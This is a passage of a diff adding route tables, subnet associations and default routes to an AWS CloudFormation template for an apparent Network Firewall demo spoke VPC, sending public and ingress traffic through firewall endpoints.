+    Properties:
+      RouteTableId: !Ref PrivateRtb2
+      SubnetId: !Ref PrivateSubnet2
+
+  PrivateRtb2DefaultRoute:
+    Type: AWS::EC2::Route
+    Properties:
+      DestinationCidrBlock: "0.0.0.0/0"
+      NatGatewayId: !Ref NatGw2
+      RouteTableId: !Ref PrivateRtb2
+
+# Public Route Tables:
+  PublicRtb1:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref SpokeVpcA
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-PublicRouteTable1
+
+  PublicRtb1Association:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref PublicRtb1
+      SubnetId: !Ref PublicSubnet1
+
+  PublicRtb1DefaultRoute:
+    Type: AWS::EC2::Route
+    DependsOn: SpokeVpcAFirewall
+    Properties:
+      DestinationCidrBlock: "0.0.0.0/0"
+      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId1
+      RouteTableId: !Ref PublicRtb1
+
+  PublicRtb2:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref SpokeVpcA
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-PublicRouteTable2
+
+  PublicRtb2Association:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref PublicRtb2
+      SubnetId: !Ref PublicSubnet2
+
+  PublicRtb2DefaultRoute:
+    Type: AWS::EC2::Route
+    DependsOn: SpokeVpcAFirewall
+    Properties:
+      DestinationCidrBlock: "0.0.0.0/0"
+      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId2
+      RouteTableId: !Ref PublicRtb2
+
+# Firewall Route Tables:
+  FirewallRtb1:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref SpokeVpcA
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-FirewallRouteTable1
+
+  FirewallRtb1Association:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref FirewallRtb1
+      SubnetId: !Ref FirewallSubnet1
+
+  FirewallRtb1DefaultRoute:
+    Type: AWS::EC2::Route
+    Properties:
+      DestinationCidrBlock: "0.0.0.0/0"
+      GatewayId: !Ref InternetGateway
+      RouteTableId: !Ref FirewallRtb1
+
+  FirewallRtb2:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref SpokeVpcA
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-FirewallRouteTable2
+
+  FirewallRtb2Association:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref FirewallRtb2
+      SubnetId: !Ref FirewallSubnet2
+
+  FirewallRtb2DefaultRoute:
+    Type: AWS::EC2::Route
+    Properties:
+      DestinationCidrBlock: "0.0.0.0/0"
+      GatewayId: !Ref InternetGateway
+      RouteTableId: !Ref FirewallRtb2
+
+# Ingress Route Table:
+  IngressRtb:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref SpokeVpcA
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-IngressRouteTable
+
+  IngressRtbAssociation:
+    Type: AWS::EC2::GatewayRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref IngressRtb
+      GatewayId: !Ref InternetGateway
+
+  IngressRtbPublicSubnet1Route:
+    Type: AWS::EC2::Route
+    DependsOn: SpokeVpcAFirewall
+    Properties:
+      DestinationCidrBlock: "10.1.1.0/24"
+      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId1
+      RouteTableId: !Ref IngressRtb
+
+  IngressRtbPublicSubnet2Route:
+    Type: AWS::EC2::Route
+    DependsOn: SpokeVpcAFirewall
+    Properties:
+      DestinationCidrBlock: "10.1.3.0/24"
+      VpcEndpointId: !GetAtt FirewallVpceIds.FwVpceId2
+      RouteTableId: !Ref IngressRtb
+
